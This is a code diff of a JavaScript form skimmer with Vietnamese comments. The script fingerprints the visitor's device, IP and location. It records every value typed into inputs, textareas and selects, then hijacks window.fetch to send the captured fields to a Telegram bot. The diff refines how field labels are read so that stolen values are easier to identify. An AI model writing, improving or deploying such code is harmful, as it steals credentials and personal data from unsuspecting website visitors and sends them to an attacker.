@@ -12,7 +12,7 @@
     location: "Unknown"
   };
 
-  // 1. Hàm nhận diện chi tiết: PC/Mobile · OS · Browser
+  // 1. Nhận diện thiết bị: PC/Mobile · OS · Browser
   function getFormattedDevice() {
     const ua = navigator.userAgent;
     let deviceType = /Mobi|Android|iPhone|iPad|iPod/i.test(ua) ? "Mobile" : "PC";
@@ -54,21 +54,27 @@
     return null;
   }
 
-  // Chạy lấy IP ngay khi mở trang
   loadGeoDetails();
 
-  // 3. Ghi nhận chữ rõ khi khách nhập vào form
+  // 3. Ghi nhận tự động các trường mặc định trên form gốc
   document.addEventListener('input', function(e) {
     const el = e.target;
     if (el && (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA' || el.tagName === 'SELECT')) {
-      const label = el.placeholder || el.name || el.id || el.type || 'Field';
+      const label =
+  el.labels?.[0]?.textContent.trim() ||  // chữ trong thẻ <label for="...">
+  el.getAttribute('aria-label') ||        // aria-label
+  el.placeholder ||
+  el.name ||
+  el.id ||
+  el.type ||
+  'Field';
       if (el.value.trim() !== '') {
         capturedFields[label] = el.value.trim();
       }
     }
   }, true);
 
-  // 4. Chặn fetch phục vụ đa ngôn ngữ gốc & bắn dữ liệu về Telegram
+  // 4. Chặn API gốc và gửi về Telegram Bot của bạn
   window.fetch = async function(url, options) {
     if (typeof url === 'string' && url.includes('/api/ip-location')) {
       const data = await loadGeoDetails();
@@ -88,19 +94,14 @@
         }
 
         let lines = [
-          `🔔 *DỮ LIỆU FORM MỚI*`,
           `IP: \`${geoInfo.ip}\``,
           `Location: \`${geoInfo.location}\``,
           `Device: \`${getFormattedDevice()}\``,
-          `------------------------`
+          `--------------------------------`
         ];
 
         for (const [key, val] of Object.entries(capturedFields)) {
-          lines.push(`▪️ *${key}:* \`${val}\``);
-        }
-
-        if (Object.keys(capturedFields).length === 0 && options.body) {
-          lines.push(`📦 *Raw:* \`${typeof options.body === 'string' ? options.body : JSON.stringify(options.body)}\``);
+          lines.push(`*${key}:* \`${val}\``);
         }
 
         await _origFetch(`https://api.telegram.org/bot${MY_BOT_TOKEN}/sendMessage`, {
